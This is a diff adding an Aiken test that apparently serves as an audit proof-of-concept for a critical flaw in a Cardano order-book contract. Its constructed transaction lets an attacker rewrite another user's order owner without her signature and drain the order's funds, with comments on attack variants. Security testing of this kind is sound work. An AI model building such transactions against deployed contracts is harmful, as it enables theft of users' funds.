@@ -879,3 +879,61 @@ test fail_sell_order_output_bad_min_ada() fail {
     good_sell_order_input,
   )
 }
+
+// Proof-of-Concept for the Critical-severity issue.
+// This test fails in the vulnerable version of the codebase.
+test exploit_takeover_and_drain() fail {
+  // After fixing, `OrderChanging` flow should NOT allow "taking over" an order,
+  // i.e. changing the `order_maker_address` field without a signature from the current maker.
+
+  // Ligitimate user "Alice"
+  // Her order is already placed in the exchange
+  let alice_order_input =
+    Input { ..input_placeholder, output: good_buy_order_output }
+
+  // Malicious actor "Mallory"
+  let mallory_address = taker_address
+  let mallory_keyhash = taker_payment_keyhash
+
+  let mallory_order_output =
+    Output {
+      ..good_buy_order_output,
+      datum: InlineDatum(
+        OrderDatum {
+          ..good_buy_order_datum,
+          order_maker_address: mallory_address,
+          // The simplest attack is to change `traded_asset_amount` to 0,
+          // then all of the order value is withdrawn immediately by Mallory.
+          traded_asset_amount: 0,
+          // Alternatively, `traded_asset_amount` can be changed to any
+          // number not exceeding the previous value, then the order
+          // could be canceled.
+
+          traded_asset_price: order_price_per_unit,
+        },
+      ),
+      value: order_marker
+        |> merge(from_lovelace(contract_order_min_ada)),
+    }
+
+  let mallory_cashout =
+    Output {
+      ..output_placeholder,
+      address: mallory_address,
+      value: from_lovelace(order_asset_amount * order_price_per_unit),
+    }
+
+  // In `order_changing.ak`, fn `try` always uses `OrderChanging` redeemer
+  try(
+    Transaction {
+      ..tx_placeholder,
+      reference_inputs: [
+        good_config_reference_input, good_listing_reference_input_no_wildcard,
+      ],
+      inputs: [alice_order_input, input_placeholder],
+      outputs: [mallory_order_output, mallory_cashout, output_placeholder],
+      extra_signatories: [mallory_keyhash],
+    },
+    alice_order_input,
+  )
+}
